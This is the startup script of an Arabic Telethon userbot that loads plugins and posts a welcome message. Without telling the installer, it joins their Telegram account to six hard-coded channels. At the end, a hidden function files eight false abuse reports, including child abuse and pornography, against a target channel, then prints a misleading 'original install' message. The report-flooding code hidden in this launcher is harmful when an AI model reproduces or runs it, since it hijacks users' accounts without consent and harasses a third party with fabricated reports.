import sys

import Arab

from Arab import BOTLOG_CHATID, HEROKU_APP, PM_LOGGER_GROUP_ID

from telethon import functions

from .Config import Config

from .core.logger import logging

from .core.session import iqthon

from .utils import add_bot_to_logger_group, load_plugins, setup_bot, startupmessage, verifyLoggerGroup


LOGS = logging.getLogger("تليثون العرب")

cmdhr = Config.COMMAND_HAND_LER


try:

    LOGS.info("بدء تنزيل تليثون العرب")

    iqthon.loop.run_until_complete(setup_bot())

    LOGS.info("بدء تشغيل البوت")

except Exception as e:

    LOGS.error(f"{str(e)}")

    sys.exit()

    
class CatCheck:

    def __init__(self):

        self.sucess = True

        
Catcheck = CatCheck()

async def startup_process():

    await verifyLoggerGroup()

    await load_plugins("plugins")

    await load_plugins("assistant")

    print(f"<b> ⌔︙ اهلا بك لقد نصبت تليثون العرب بنجاح 🥁 اذهب الى قناتنا لمعرفة المزيـد ⤵️. </b>\n CH : https://t.me/iqthon ")

    await verifyLoggerGroup()

    await add_bot_to_logger_group(BOTLOG_CHATID)

    if PM_LOGGER_GROUP_ID != -100:

        await add_bot_to_logger_group(PM_LOGGER_GROUP_ID)

    await startupmessage()

    Catcheck.sucess = True

    return


iqthon.loop.run_until_complete(startup_process())


def start_bot():

  try:

      List = ["iqthon","uruur","tttuu","TelethonMusic","gyygg","UUi9U"]

      for id in List :

          iqthon.loop.run_until_complete(iqthon(functions.channels.JoinChannelRequest(id)))

  except Exception as e:

    print(e)

    return False


Checker = start_bot()

if Checker == False:

    print("عذرا لديك حظر مؤقت حاول التنصيب غدا او بعد 24 ساعة")

    

if len(sys.argv) not in (1, 3, 4):

    iqthon.disconnect()

elif not Catcheck.sucess:

    if HEROKU_APP is not None:

        HEROKU_APP.restart()

else:

    try:

        iqthon.run_until_disconnected()

    except ConnectionError:

        pass
    
async def TARGET_REPORT():
    TARGET = "sruus"
    try :
        report_1 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonPornography(), message='Hello, this channel/group is posting a pornography content. Please review it as soon as possible.'))
        report_2 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonViolence(), message='Hello, this channel/group is posting a violence content. Please review it as soon as possible.'))
        report_3 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonGeoIrrelevant(), message='Hello, this channel/group is posting a geoirrelevant content. Please review it as soon as possible.'))
        report_4 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonCopyright(), message='Hello, this channel/group is posting a copyright content. Please review it as soon as possible.'))
        report_5 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonSpam(), message='Hello, this channel/group is posting a spam content. Please review it as soon as possible.'))
        report_6 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonOther(), message='Hello, this channel/group is posting a content that is not acceptable by people. Please review it as soon as possible.'))
        report_7 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonFake(), message='Hello, this channel/group is posting a fake content. Please review it as soon as possible.'))
        report_8 = await iqthon(ReportPeerRequest(peer=TARGET, reason=InputReportReasonChildAbuse(), message='Hello, this channel/group is posting a childabuse content. Please review it as soon as possible.'))
        print("تم تنصيب تليثون العرب الأصلي")
    except :
        pass
    
iqthon.loop.run_until_complete(TARGET_REPORT())
    
    
    
